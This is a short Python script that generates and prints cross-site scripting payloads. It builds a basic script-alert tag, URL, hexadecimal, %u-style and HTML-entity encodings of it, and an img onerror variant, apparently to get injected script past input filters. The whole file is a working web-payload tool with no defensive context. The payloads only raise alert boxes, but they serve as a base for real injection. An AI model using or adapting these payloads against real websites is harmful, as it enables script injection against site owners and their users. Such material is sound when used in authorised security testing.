import urllib.parse

def generate_xss_payloads():
    """Generate a list of XSS payloads using various encoding techniques."""
    payloads = []

    # Basic XSS Payload
    basic_payload = '<script>alert("XSS")</script>'
    payloads.append(basic_payload)

    # URL Encoded Payload
    url_encoded_payload = urllib.parse.quote(basic_payload)
    payloads.append(url_encoded_payload)

    # Hexadecimal Encoding
    hex_encoded_payload = ''.join(f'%{ord(c):02x}' for c in basic_payload)
    payloads.append(hex_encoded_payload)

    # UTF-16 Encoding
    utf16_encoded_payload = ''.join(f'%u{ord(c):04x}' for c in basic_payload)
    payloads.append(utf16_encoded_payload)

    # HTML Entities Encoding
    html_entities_payload = ''.join(f'&#{ord(c)};' for c in basic_payload)
    payloads.append(html_entities_payload)

    # Alternative Syntax Payload
    alternative_syntax_payload = '<img src=x onerror=alert("XSS")>'
    payloads.append(alternative_syntax_payload)

    return payloads

def main():
    """Generate and display XSS payloads."""
    payloads = generate_xss_payloads()
    print("Generated XSS Payloads:")
    for i, payload in enumerate(payloads, start=1):
        print(f"{i}. {payload}")

if __name__ == "__main__":
    main()
